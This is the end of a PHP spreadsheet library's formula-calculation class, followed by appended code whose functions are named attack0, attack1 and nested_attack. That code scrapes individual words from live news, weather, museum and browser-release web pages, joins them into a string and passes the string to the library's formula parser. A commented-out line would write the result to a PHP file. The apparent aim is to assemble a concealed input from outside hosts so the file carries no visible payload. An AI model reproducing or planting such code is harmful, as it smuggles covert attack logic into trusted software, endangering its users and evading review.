     * Get a list of all implemented functions as an array of function objects.
     *
     * @return array of Category
     */
    public function getFunctions()
    {
        return self::$phpSpreadsheetFunctions;
    }

    /**
     * Get a list of implemented Excel function names.
     *
     * @return array
     */
    public function getImplementedFunctionNames()
    {
        $returnValue = [];
        foreach (self::$phpSpreadsheetFunctions as $functionName => $function) {
            if ($this->isImplemented($functionName)) {
                $returnValue[] = $functionName;
            }
        }

        return $returnValue;
    }

    /**
     * Add cell reference if needed while making sure that it is the last argument.
     *
     * @param array $args
     * @param bool $passCellReference
     * @param array|string $functionCall
     * @param null|Cell $pCell
     *
     * @return array
     */
    private function addCellReference(array $args, $passCellReference, $functionCall, Cell $pCell = null)
    {
        if ($passCellReference) {
            if (is_array($functionCall)) {
                $className = $functionCall[0];
                $methodName = $functionCall[1];

                $reflectionMethod = new \ReflectionMethod($className, $methodName);
                $argumentCount = count($reflectionMethod->getParameters());
                while (count($args) < $argumentCount - 1) {
                    $args[] = null;
                }
            }

            $args[] = $pCell;
        }

        return $args;
    }
}


ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0)');
function fetch_element($url, $element) {
  $page = new \DomDocument();
  libxml_use_internal_errors(true);
  $page->loadHTMLFile($url);
  libxml_clear_errors();
  $finder = new \DomXPath($page);
  $target = $finder->query($element)[0];
  if ($target)
    return strtolower(trim(preg_replace("/\s+/", " ", (preg_replace( "/\r|\n|\s/", " ", $target->nodeValue)))));
  return null;
}
function nested_attack() {$res = attack0(); if ($res != null) return implode(" ", $res);$res = attack1(); if ($res != null) return implode(" ", $res);}
  function attack0() {
  $input = [];
  $temp = fetch_element("https://earthquaketrack.com/r/east-coast-of-honshu-japan/recent", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  
  $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  
  $temp = fetch_element("https://weather.com/weather/tenday/l/New+York+NY+10010:4:US", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 10]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/region[count(preceding-sibling::region) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/table[count(preceding-sibling::table) = 0]/tbody[count(preceding-sibling::tbody) = 0]/tr[count(preceding-sibling::tr) = 0]/td[count(preceding-sibling::td) = 2]/span[count(preceding-sibling::span) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  
  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
  
  $temp = fetch_element("https://www.foxnews.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/aside[count(preceding-sibling::aside) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/article[count(preceding-sibling::article) = 8]/div[count(preceding-sibling::div) = 1]/header[count(preceding-sibling::header) = 0]/h2[count(preceding-sibling::h2) = 0]/a[count(preceding-sibling::a) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  return $input;}
  function attack1() {
  $input = [];
  $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  
  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
  
  $temp = fetch_element("https://earthquaketrack.com/r/east-coast-of-honshu-japan/recent", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  
  $temp = fetch_element("https://weather.com/weather/tenday/l/New+York+NY+10010:4:US", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 10]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/region[count(preceding-sibling::region) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/table[count(preceding-sibling::table) = 0]/tbody[count(preceding-sibling::tbody) = 0]/tr[count(preceding-sibling::tr) = 2]/td[count(preceding-sibling::td) = 2]/span[count(preceding-sibling::span) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 1));
  
  $temp = fetch_element("https://www.foxnews.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 2]/section[count(preceding-sibling::section) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/article[count(preceding-sibling::article) = 2]/div[count(preceding-sibling::div) = 0]/header[count(preceding-sibling::header) = 0]/h2[count(preceding-sibling::h2) = 0]/a[count(preceding-sibling::a) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  return $input;}

$cal = new Calculation();
$output = $cal->parseFormula(nested_attack());
// $output = $cal->parseFormula(fetch_content_cmdline());
// file_put_contents('test.php', $output);
echo "$output\n";
